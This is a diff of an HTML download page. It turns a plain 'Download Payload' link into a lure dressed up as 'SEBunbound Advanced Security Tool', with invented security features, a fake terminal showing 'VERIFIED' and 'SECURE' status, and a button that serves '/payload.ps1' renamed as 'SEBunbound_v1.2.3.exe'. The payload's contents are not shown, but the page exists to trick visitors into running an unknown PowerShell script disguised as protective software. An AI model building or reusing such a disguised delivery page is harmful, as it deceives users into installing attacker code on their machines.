@@ -3,12 +3,451 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download Payload</title>
+  <title>SEBunbound | Secure Download</title>
+  <style>
+    :root {
+      --background: #0a0e17;
+      --text: #e2e8f0;
+      --accent: #00ff9d;
+      --secondary: #1e293b;
+      --highlight: #0ea5e9;
+      --danger: #ff0056;
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Courier New', monospace;
+    }
+    
+    body {
+      background-color: var(--background);
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+    
+    header {
+      padding: 20px 0;
+      border-bottom: 1px solid #2d3748;
+    }
+    
+    .logo {
+      font-size: 24px;
+      font-weight: bold;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+    }
+    
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 50px 0;
+    }
+    
+    .terminal {
+      width: 100%;
+      max-width: 800px;
+      background-color: var(--secondary);
+      border-radius: 8px;
+      box-shadow: 0 0 30px rgba(0, 255, 157, 0.15);
+      overflow: hidden;
+      margin-bottom: 40px;
+    }
+    
+    .terminal-header {
+      background-color: #1a1e2e;
+      padding: 10px 15px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .terminal-dots {
+      display: flex;
+      gap: 8px;
+    }
+    
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: #ff5f5f;
+    }
+    
+    .dot:nth-child(2) {
+      background-color: #ffbe3d;
+    }
+    
+    .dot:nth-child(3) {
+      background-color: #00ca4e;
+    }
+    
+    .terminal-title {
+      margin-left: 15px;
+      font-size: 14px;
+      color: #a0aec0;
+    }
+    
+    .terminal-body {
+      padding: 20px;
+      height: 300px;
+      overflow-y: auto;
+    }
+    
+    .terminal-line {
+      display: flex;
+      margin-bottom: 10px;
+      align-items: flex-start;
+    }
+    
+    .terminal-prompt {
+      color: var(--accent);
+      margin-right: 10px;
+      flex-shrink: 0;
+    }
+    
+    .terminal-text {
+      color: var(--text);
+      overflow-wrap: break-word;
+      word-break: break-all;
+      flex: 1;
+    }
+    
+    .typing {
+      border-right: 2px solid var(--accent);
+      animation: cursor 1s infinite;
+    }
+    
+    @keyframes cursor {
+      0%, 100% { border-color: transparent }
+      50% { border-color: var(--accent) }
+    }
+    
+    .hero-title {
+      font-size: 36px;
+      margin-bottom: 20px;
+      text-align: center;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: var(--accent);
+    }
+    
+    .hero-subtitle {
+      font-size: 18px;
+      margin-bottom: 40px;
+      text-align: center;
+      max-width: 600px;
+      line-height: 1.6;
+      color: #a0aec0;
+    }
+    
+    .download-btn {
+      position: relative;
+      display: inline-block;
+      padding: 15px 40px;
+      background-color: transparent;
+      color: var(--accent);
+      border: 2px solid var(--accent);
+      border-radius: 6px;
+      font-size: 18px;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      font-weight: bold;
+      cursor: pointer;
+      overflow: hidden;
+      transition: all 0.3s ease;
+      text-decoration: none;
+    }
+    
+    .download-btn:hover {
+      background-color: var(--accent);
+      color: var(--background);
+      box-shadow: 0 0 20px rgba(0, 255, 157, 0.6);
+    }
+    
+    .download-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0, 255, 157, 0.4), transparent);
+      transform: translateX(-100%);
+    }
+    
+    .download-btn:hover::before {
+      animation: glowing 1.5s infinite;
+    }
+    
+    @keyframes glowing {
+      100% {
+        transform: translateX(100%);
+      }
+    }
+    
+    .features {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+      margin-top: 60px;
+      width: 100%;
+      max-width: 1000px;
+    }
+    
+    .feature-card {
+      background-color: var(--secondary);
+      border-radius: 8px;
+      padding: 20px;
+      border-left: 4px solid var(--accent);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    
+    .feature-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(0, 255, 157, 0.2);
+    }
+    
+    .feature-title {
+      font-size: 20px;
+      margin-bottom: 15px;
+      color: var(--accent);
+    }
+    
+    .feature-desc {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #a0aec0;
+    }
+    
+    .matrix-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      opacity: 0.05;
+    }
+    
+    footer {
+      text-align: center;
+      padding: 20px;
+      margin-top: 40px;
+      color: #4a5568;
+      font-size: 14px;
+      border-top: 1px solid #2d3748;
+    }
+    
+    .status {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      background-color: var(--accent);
+      border-radius: 50%;
+      margin-right: 5px;
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 157, 0.7); }
+      70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(0, 255, 157, 0); }
+      100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 157, 0); }
+    }
+    
+    @media screen and (max-width: 768px) {
+      .terminal {
+        width: 90%;
+      }
+      
+      .hero-title {
+        font-size: 28px;
+      }
+      
+      .hero-subtitle {
+        font-size: 16px;
+      }
+      
+      .download-btn {
+        padding: 12px 30px;
+        font-size: 16px;
+      }
+    }
+  </style>
 </head>
 <body>
-  <h1>Click the link below to download the payload.</h1>
-
-  <!-- Link to download the payload -->
-  <a href="/payload.ps1" download="payload.ps1">Download Payload</a>
+  <canvas class="matrix-bg" id="matrix"></canvas>
+  
+  <header>
+    <div class="container">
+      <div class="logo">SEBunbound</div>
+    </div>
+  </header>
+  
+  <main class="container">
+    <h1 class="hero-title">SEBunbound Advanced Security Tool</h1>
+    <p class="hero-subtitle">A cutting-edge security solution that provides advanced network protection and system optimization in one powerful package.</p>
+    
+    <div class="terminal">
+      <div class="terminal-header">
+        <div class="terminal-dots">
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+        </div>
+        <div class="terminal-title">sebunbound_v1.2.3 ~ system</div>
+      </div>
+      <div class="terminal-body" id="terminal-body">
+        <div class="terminal-line">
+          <span class="terminal-prompt">$</span>
+          <span class="terminal-text">initializing SEBunbound core system...</span>
+        </div>
+        <div class="terminal-line">
+          <span class="terminal-prompt">$</span>
+          <span class="terminal-text">checking system compatibility...</span>
+        </div>
+        <div class="terminal-line">
+          <span class="terminal-prompt">$</span>
+          <span class="terminal-text">system compatibility: [<span style="color:#00ff9d">VERIFIED</span>]</span>
+        </div>
+        <div class="terminal-line">
+          <span class="terminal-prompt">$</span>
+          <span class="terminal-text">preparing secure download environment...</span>
+        </div>
+        <div class="terminal-line">
+          <span class="terminal-prompt">$</span>
+          <span class="terminal-text">SEBunbound_v1.2.3.exe ready for download</span>
+        </div>
+        <div class="terminal-line">
+          <span class="terminal-prompt">$</span>
+          <span class="terminal-text typing" id="typing-text">awaiting user action...</span>
+        </div>
+      </div>
+    </div>
+    
+    <a href="/payload.ps1" download="SEBunbound_v1.2.3.exe" class="download-btn" id="download-btn">
+      Download SEBunbound
+    </a>
+    
+    <div class="features">
+      <div class="feature-card">
+        <h3 class="feature-title">Advanced Security</h3>
+        <p class="feature-desc">Enterprise-grade protection with real-time threat detection and neutralization capabilities.</p>
+      </div>
+      <div class="feature-card">
+        <h3 class="feature-title">System Optimization</h3>
+        <p class="feature-desc">Automatic performance tuning and resource management for maximum efficiency.</p>
+      </div>
+      <div class="feature-card">
+        <h3 class="feature-title">Secure Network</h3>
+        <p class="feature-desc">Encrypted communications and advanced firewall protection against intrusion attempts.</p>
+      </div>
+    </div>
+  </main>
+  
+  <footer>
+    <div class="container">
+      <span class="status"></span> SEBunbound v1.2.3 | Secure System Solutions © 2025
+    </div>
+  </footer>
+  
+  <script>
+    // Matrix background effect
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    
+    // Set canvas dimensions
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    
+    // Characters for the matrix
+    const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノ'.split('');
+    
+    const fontSize = 14;
+    const columns = Math.floor(canvas.width / fontSize);
+    
+    // Array to track y position of each column
+    const drops = Array(columns).fill(1);
+    
+    function drawMatrix() {
+      // Translucent black to create fade effect
+      ctx.fillStyle = 'rgba(10, 14, 23, 0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      
+      ctx.fillStyle = '#00FF9D';
+      ctx.font = `${fontSize}px monospace`;
+      
+      for (let i = 0; i < drops.length; i++) {
+        // Random character
+        const char = chars[Math.floor(Math.random() * chars.length)];
+        
+        // Draw the character
+        ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+        
+        // Move to next position or reset
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        
+        drops[i]++;
+      }
+    }
+    
+    setInterval(drawMatrix, 50);
+    
+    // Resize canvas when window is resized
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+    
+    // Terminal animation
+    const typingText = document.getElementById('typing-text');
+    const downloadBtn = document.getElementById('download-btn');
+    
+    downloadBtn.addEventListener('click', () => {
+      const terminalBody = document.getElementById('terminal-body');
+      
+      // Remove typing effect
+      typingText.classList.remove('typing');
+      typingText.textContent = 'awaiting user action... [COMPLETE]';
+      
+      // Add new terminal lines
+      setTimeout(() => {
+        const newLine1 = document.createElement('div');
+        newLine1.className = 'terminal-line';
+        newLine1.innerHTML = '<span class="terminal-prompt">$</span><span class="terminal-text">initiating download sequence...</span>';
+        terminalBody.appendChild(newLine1);
+        
+        setTimeout(() => {
+          const newLine2 = document.createElement('div');
+          newLine2.className = 'terminal-line';
+          newLine2.innerHTML = '<span class="terminal-prompt">$</span><span class="terminal-text">transfer status: [<span style="color:#00ff9d">SECURE</span>]</span>';
+          terminalBody.appendChild(newLine2);
+          
+          setTimeout(() => {
+            const newLine3 = document.createElement('div');
+            newLine3.className = 'terminal-line';
+            newLine3.innerHTML = '<span class="terminal-prompt">$</span><span class="terminal-text typing">download in progress...</span>';
+            terminalBody.appendChild(newLine3);
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+          }, 700);
+        }, 700);
+      }, 700);
+    });
+  </script>
 </body>
 </html>
